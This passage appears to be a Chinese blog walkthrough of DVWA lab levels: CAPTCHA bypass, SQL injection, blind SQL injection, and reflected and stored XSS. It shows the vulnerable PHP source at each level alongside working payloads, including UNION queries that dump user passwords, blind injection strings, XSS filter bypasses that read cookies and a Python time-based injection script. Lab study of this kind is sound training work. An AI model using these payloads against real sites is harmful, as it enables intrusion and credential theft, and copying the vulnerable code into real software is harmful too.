$resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], 
$_SERVER[ &#39;REMOTE_ADDR&#39; ], 
$_POST[ &#39;recaptcha_challenge_field&#39; ], 
$_POST[ &#39;recaptcha_response_field&#39; ] ); 

// Did the CAPTCHA fail? 
if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ &#39;recaptcha_response_field&#39; ] != &#39;hidd3n_valu3&#39; || $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] != &#39;reCAPTCHA&#39; ) ) { 
// What happens when the CAPTCHA was entered incorrectly 
$html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; 
$hide_form = false; 
return; 
} 
else { 
// CAPTCHA was correct. Do both new passwords match? 
if( $pass_new == $pass_conf ) { 
$pass_new = mysql_real_escape_string( $pass_new ); 
$pass_new = md5( $pass_new ); 

// Update database 
$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; 
$result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Feedback for user 
echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
} 
else { 
// Ops. Password mismatch 
$html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; 
$hide_form = false; 
} 
} 

mysql_close(); 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt;
</code></pre><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>更改参数recaptcha_response_field以及http包头的User-Agent：等于reCAPTCHA</p>
<p><img src="http://oy0tigw51.bkt.clouddn.com/201710241515_889.png" alt=""></p>
<p>impossible：<br>该级别代码未发现漏洞</p>
<h3 id="八：SQL-Injection（SQL注入）"><a href="#八：SQL-Injection（SQL注入）" class="headerlink" title="八：SQL Injection（SQL注入）"></a>八：SQL Injection（SQL注入）</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<p>手工注入（非盲注）的步骤。</p>
<pre><code>1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据
</code></pre><p>Low：</p>
<pre><code>&lt;?php 

if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { 
// Get input 
$id = $_REQUEST[ &#39;id&#39; ]; 

// Check database 
$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Get results 
$num = mysql_numrows( $result ); 
$i   = 0; 
while( $i &lt; $num ) { 
// Get values 
$first = mysql_result( $result, $i, &quot;first_name&quot; ); 
$last  = mysql_result( $result, $i, &quot;last_name&quot; ); 

// Feedback for end user 
echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; 

// Increase loop count 
$i++; 
} 

mysql_close(); 
} 

?&gt;
</code></pre><p>1.<img src="http://oy0tigw51.bkt.clouddn.com/201710241530_443.png" alt=""></p>
<p><img src="http://oy0tigw51.bkt.clouddn.com/201710241533_295.png" alt=""><br>2.猜解SQL查询语句中的字段数<br>union select 1,2,3<br>3.确定显示的字段顺序<br>1′ union select 1,2 #<br>4.获取当前数据库</p>
<p>输入1′ union select 1,database() #，<br>5.获取数据库中的表</p>
<p>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，<br>6.获取表中的字段名</p>
<p>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #<br>7.下载数据</p>
<p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br>的数据<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241607_214.png" alt=""></p>
<p>得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<h5 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h5><p>&lt;?php </p>
<p>if( isset( $_POST[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_POST[ ‘id’ ];<br>    $id = mysql_real_escape_string( $id ); </p>
<pre><code>// Check database 
$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Get results 
$num = mysql_numrows( $result ); 
$i   = 0; 
while( $i &lt; $num ) { 
    // Display values 
    $first = mysql_result( $result, $i, &quot;first_name&quot; ); 
    $last  = mysql_result( $result, $i, &quot;last_name&quot; ); 

    // Feedback for end user 
    echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; 

    // Increase loop count 
    $i++; 
} 

//mysql_close(); 
</code></pre><p>} </p>
<p>?&gt;</p>
<p>区别代码：</p>
<blockquote>
<p>$id = mysql_real_escape_string( $id );</p>
</blockquote>
<p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入<br>依然可以通过抓包改参数，提交恶意构造的查询参数。<br>1.判断是否存在注入，注入是字符型还是数字型<br>1.id为1 or 1=1 #<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241617_591.png" alt=""><br>查询成功<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241618_406.png" alt=""><br>2.猜解SQL查询语句中的字段数</p>
<p>抓包更改参数id为1 order by 2 #，查询成功：<br>抓包更改参数id为1 order by 3 #，报错：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
<p>3.确定显示的字段顺序</p>
<p>抓包更改参数id为1 union select 1,2 #，查询成功：<br>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p>
<p>4.获取当前数据库</p>
<p>抓包更改参数id为1 union select 1,database() #，查询成功：<br>说明当前的数据库为dvwa。</p>
<p>5.获取数据库中的表</p>
<p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<p>6.获取表中的字段名</p>
<p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p>
<p>这是因为单引号被转义了，变成了\’。</p>
<p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<p>7.得到数据</p>
<p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241642_694.png" alt=""><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<p>High：</p>
<p>&lt;?php </p>
<p>if( isset( $_SESSION [ ‘id’ ] ) ) {<br>    // Get input<br>    $id = $_SESSION[ ‘id’ ]; </p>
<pre><code>// Check database 
$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); 

// Get results 
$num = mysql_numrows( $result ); 
$i   = 0; 
while( $i &lt; $num ) { 
    // Get values 
    $first = mysql_result( $result, $i, &quot;first_name&quot; ); 
    $last  = mysql_result( $result, $i, &quot;last_name&quot; ); 

    // Feedback for end user 
    echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; 

    // Increase loop count 
    $i++; 
} 

mysql_close(); 
</code></pre><p>} </p>
<p>?&gt; </p>
<p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<blockquote>
<p>$query  = “SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;”; </p>
</blockquote>
<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。<br>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p>
<p>Impossible：<br>Impossible级别的代码采用了PDO技术，暂时不会</p>
<p><a href="http://blog.chinaunix.net/uid-11582448-id-4432211.html" target="_blank" rel="external">SQLmap注入方法注入dvwa
</a></p>
<h3 id="九：SQL-Injection-Blind"><a href="#九：SQL-Injection-Blind" class="headerlink" title="九：SQL Injection(Blind)"></a>九：SQL Injection(Blind)</h3><p>手工盲注的步骤（可与之前的手工注入作比较）：</p>
<pre><code>1.判断是否存在注入，注入是字符型还是数字型

2.猜解当前数据库名

3.猜解数据库中的表名

4.猜解表中的字段名

5.猜解数据
</code></pre><p>Low：</p>
<p>&lt;?php </p>
<p>if( isset( $_GET[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_GET[ ‘id’ ]; </p>
<pre><code>// Check database 
$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
$result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors 

// Get results 
$num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors 
if( $num &gt; 0 ) { 
    // Feedback for end user 
    echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
} 
else { 
    // User wasn&#39;t found, so the page wasn&#39;t! 
    header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 

    // Feedback for end user 
    echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
} 

mysql_close(); 
</code></pre><p>} </p>
<p>?&gt; </p>
<p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p>
<p>基于布尔的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：<br>输入1’ and 1=1 #，显示存在：<br>输入1’ and 1=2 #，显示不存在：<br>说明存在字符型的SQL盲注。<br>2.猜解当前数据库名</p>
<p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
<pre><code>输入1’ and length(database())=1 #，显示不存在；

输入1’ and length(database())=2 #，显示不存在；

输入1’ and length(database())=3 #，显示不存在；

输入1’ and length(database())=4 #，显示存在：
</code></pre><p>说明数据库名长度为4。</p>
<p>下面采用二分法猜解数据库名。</p>
<pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；

输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；

输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；

输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；

输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；

输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。

…
</code></pre><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>3.猜解数据库中的表名</p>
<p>首先猜解数据库中表的数量：</p>
<pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在

1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
</code></pre><p>说明数据库中共有两个表。</p>
<p>接着挨个猜解表名：</p>
<pre><code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在

…

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
</code></pre><p>说明第一个表名长度为9。</p>
<pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在
</code></pre><p>说明第一个表的名字的第一个字符为小写字母g。</p>
<p>…</p>
<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。<br>4.猜解表中的字段名</p>
<p>首先猜解表中字段的数量：</p>
<pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在

…

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
</code></pre><p>说明users表有8个字段。</p>
<p>接着挨个猜解字段名：</p>
<pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在

…

1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
</code></pre><p>说明users表的第一个字段为7个字符长度。</p>
<p>采用二分法，即可猜解出所有字段名。<br>5.猜解数据</p>
<p>同样采用二分法。</p>
<p>还可以使用基于时间的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型</p>
<pre><code>输入1’ and sleep(5) #，感觉到明显延迟；

输入1 and sleep(5) #，没有延迟；
</code></pre><p>说明存在字符型的基于时间的盲注。<br>2.猜解当前数据库名</p>
<p>首先猜解数据名的长度：</p>
<pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟

1’ and if(length(database())=2,sleep(5),1) # 没有延迟

1’ and if(length(database())=3,sleep(5),1) # 没有延迟

1’ and if(length(database())=4,sleep(5),1) # 明显延迟
</code></pre><p>说明数据库名长度为4个字符。</p>
<p>接着采用二分法猜解数据库名：</p>
<pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟

…

1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟

1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟

说明数据库名的第一个字符为小写字母d。

…
</code></pre><p>重复上述步骤，即可猜解出数据库名。<br>3.猜解数据库中的表名</p>
<p>首先猜解数据库中表的数量：</p>
<pre><code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟

1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
</code></pre><p>说明数据库中有两个表。</p>
<p>接着挨个猜解表名：</p>
<pre><code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟

…

1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
</code></pre><p>说明第一个表名的长度为9个字符。</p>
<p>采用二分法即可猜解出表名。<br>4.猜解表中的字段名</p>
<p>首先猜解表中字段的数量：</p>
<pre><code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟

…

1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
</code></pre><p>说明users表中有8个字段。</p>
<p>接着挨个猜解字段名：</p>
<pre><code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟

…

1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
</code></pre><p>说明users表的第一个字段长度为7个字符。</p>
<p>采用二分法即可猜解出各个字段名。<br>5.猜解数据</p>
<p>同样采用二分法。太浪费时间了。推荐写python脚本</p>
<pre><code># -*-coding:utf-8-*-  
import requests  
import time

payloads = &#39;abcdefghijklmnopqrstuvwxyz0123456789@_.{}-&#39;
flag = &#39;&#39;
url = &quot;http://222.18.158.243:4609/index.php&quot;
print(&#39;test1&#39;)
for x in range(1,7):
for char in payloads:
starttime = time.time()
payload = {&quot;id&quot;: &quot;1 and if(substring(database(), &quot;+str(x)+&quot;, 1)=&#39;&quot;+char+&quot;&#39;,sleep(6),1)#&quot;}
rev = requests.get(url, cookies=cookies, params=payload)
if time.time() - starttime &gt; 6:
flag += char
print(&#39;DatabaseName = &#39;+flag)
</code></pre><p>Medium：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 
// Get input 
$id = $_POST[ &#39;id&#39; ]; 
$id = mysql_real_escape_string( $id ); 

// Check database 
$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; 
$result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors 

// Get results 
$num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors 
if( $num &gt; 0 ) { 
// Feedback for end user 
echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
} 
else { 
// Feedback for end user 
echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
} 

//mysql_close(); 
} 

?&gt; 
</code></pre><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
<p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
<p>基于布尔的盲注：</p>
<pre><code>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；

抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；

抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。
</code></pre><p>基于时间的盲注：</p>
<pre><code>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；

抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；

抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。
</code></pre><p>High：</p>
<pre><code>&lt;?php 

if( isset( $_COOKIE[ &#39;id&#39; ] ) ) { 
// Get input 
$id = $_COOKIE[ &#39;id&#39; ]; 

// Check database 
$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; 
$result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors 

// Get results 
$num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors 
if( $num &gt; 0 ) { 
// Feedback for end user 
echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
} 
else { 
// Might sleep a random amount 
if( rand( 0, 5 ) == 3 ) { 
sleep( rand( 2, 4 ) ); 
} 

// User wasn&#39;t found, so the page wasn&#39;t! 
header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 

// Feedback for end user 
echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
} 

mysql_close(); 
} 

?&gt;
</code></pre><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。<br>漏洞利用</p>
<p>虽然添加了LIMIT 1，但是可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，基于布尔的盲注：</p>
<pre><code>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；

抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；

抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
</code></pre><p>Impossible</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Submit&#39; ] ) ) { 
// Check Anti-CSRF token 
checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 

// Get input 
$id = $_GET[ &#39;id&#39; ]; 

// Was a number entered? 
if(is_numeric( $id )) { 
// Check the database 
$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); 
$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); 
$data-&gt;execute(); 

// Get results 
if( $data-&gt;rowCount() == 1 ) { 
// Feedback for end user 
echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
} 
else { 
// User wasn&#39;t found, so the page wasn&#39;t! 
header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 

// Feedback for end user 
echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
} 
} 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt;
</code></pre><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 基本无法注入。</p>
<h3 id="十-反射型XSS"><a href="#十-反射型XSS" class="headerlink" title="十:反射型XSS"></a>十:反射型XSS</h3><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>推荐xss cheat sheet<br><a href="http://www.52bug.cn/?post=211" target="_blank" rel="external">xss漏洞检测指南</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241842_78.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241843_306.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241844_339.png" alt=""></p>
<p>Low：</p>
<pre><code>&lt;?php 

// Is there any input? 

if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { 

// Feedback for end user 

echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; 

} 

?&gt;
</code></pre><p>无验证，直接注入</p>
<script>alert(document.cookie)</script>爆出cookie内容

![](http://oy0tigw51.bkt.clouddn.com/201710241848_956.png)

Medium：

    <?php 
    // Is there any input? 
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
    } 
    ?>

可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。

双写绕过
输入<sc<script>ript>alert(/xss/)</script>，成功弹框：
![](http://oy0tigw51.bkt.clouddn.com/201710241856_385.png)
大小写混淆绕过

输入<script>alert(/xss/)</script>，成功弹框

High：

    <?php 
    // Is there any input? 
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}"; 
    } 
    ?>

可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。
绕过思路：标签很多，换一种标签即可。这里用img
<img src="1" onerror="alert(document.cookie)">
![](http://oy0tigw51.bkt.clouddn.com/201710241900_85.png)

Impossible：


    <?php 
    // Is there any input? 
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    // Get input 
    $name = htmlspecialchars( $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}"; 
    } 
    // Generate Anti-CSRF token 
    generateSessionToken(); 
    ?>

Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。无法注入。





### 十一：存储型XSS
Low：


    <?php 
    if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name= trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = mysql_real_escape_string( $message ); 
    // Sanitize name input 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '' ); 
    //mysql_close(); 
    } 
    ?>


stripslashes(string)函数删除字符串中的反斜杠。
可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<script>alert(/xss/)</script> 
name一栏前端有字数限制，burp抓包改为<script>alert(/name/)</script>

<p>Medium</p>
<pre><code>&lt;?php 
if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { 
// Get input 
$message = trim( $_POST[ &#39;mtxMessage&#39; ] ); 
$name= trim( $_POST[ &#39;txtName&#39; ] ); 
// Sanitize message input 
$message = strip_tags( addslashes( $message ) ); 
$message = mysql_real_escape_string( $message ); 
$message = htmlspecialchars( $message ); 
// Sanitize name input 
$name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); 
$name = mysql_real_escape_string( $name ); 
// Update database 
$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 
//mysql_close(); 
} 
?&gt;
</code></pre><p>查看源码发现Name只过滤了<scrpit>标签<br>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。<br>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>burp抓包改name参数为<sc<script>ript&gt;alert(/xss/):<br>2.大小写混淆绕过<br>抓包改name参数为<script>alert(/xss/)</script>:<br>High</sc<script></b></scrpit></p>
<pre><code>&lt;?php 
if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { 
// Get input 
$message = trim( $_POST[ &#39;mtxMessage&#39; ] ); 
$name= trim( $_POST[ &#39;txtName&#39; ] ); 
// Sanitize message input 
$message = strip_tags( addslashes( $message ) ); 
$message = mysql_real_escape_string( $message ); 
$message = htmlspecialchars( $message ); 
// Sanitize name input 
$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); 
$name = mysql_real_escape_string( $name ); 
// Update database 
$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 
//mysql_close(); 
} 
?&gt;
</code></pre><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );<br>绕过思路：HTML页面修改Name的最大输入长度，注入Name，注入换一种标签，这里用img<br><img src="1" onerror="alert(document.cookie)"></p>
<p>Impossible</p>
<pre><code>&lt;?php 
if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { 
// Check Anti-CSRF token 
checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 
// Get input 
$message = trim( $_POST[ &#39;mtxMessage&#39; ] ); 
$name= trim( $_POST[ &#39;txtName&#39; ] ); 
// Sanitize message input 
$message = stripslashes( $message ); 
$message = mysql_real_escape_string( $message ); 
$message = htmlspecialchars( $message ); 
// Sanitize name input 
$name = stripslashes( $name ); 
$name = mysql_real_escape_string( $name ); 
$name = htmlspecialchars( $name ); 
// Update database 
$data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); 
